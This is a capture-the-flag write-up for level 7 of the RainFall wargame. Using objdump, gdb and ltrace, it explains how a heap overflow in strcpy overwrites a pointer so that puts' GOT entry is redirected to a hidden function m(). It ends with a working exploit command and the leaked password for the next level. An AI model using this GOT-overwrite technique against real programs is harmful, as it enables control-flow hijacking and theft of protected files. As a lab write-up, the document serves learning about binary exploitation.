# Level 7

i try to execute the level7 and i found that the program wait to insert two argument if not segmantation fault i passed two rand argument and the program print '~~'

```c
level7@RainFall:~$ objdump -t level7 |  grep text
08048440 l    d  .text	00000000              .text
08048470 l     F .text	00000000              __do_global_dtors_aux
080484d0 l     F .text	00000000              frame_dummy
08048690 l     F .text	00000000              __do_global_ctors_aux
08048680 g     F .text	00000002              __libc_csu_fini
08048682 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
08048610 g     F .text	00000061              __libc_csu_init
08048440 g     F .text	00000000              _start
080484f4 g     F .text	0000002d              m
08048521 g     F .text	000000e2              main
```

we found two function in this program main and m() so lets disass with gdb

```c
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
```

i try it with ltrace and i got

```c
level7@RainFall:~$ ltrace ./level7 aaa bbb
__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                    = 0x0804a008
malloc(8)                                    = 0x0804a018
malloc(8)                                    = 0x0804a028
malloc(8)                                    = 0x0804a038
strcpy(0x0804a018, "aaa")                    = 0x0804a018
strcpy(0x0804a038, "bbb")                    = 0x0804a038
fopen("/home/user/level8/.pass", "r")        = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
```

Disass puts

```c
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:     push   0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

so we need to change the adress 0x0804a038 by this adress 0x8049928 and redirect our program to the function m()

to change the adress 0x0804a038 we need 20 characters to fill the allocation first we concat with the address 0x8049928 and then pass the m address as second argument like this

```c
level7@RainFall:~$ ./level7 `python -c "print 'A'*20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1676224643
```
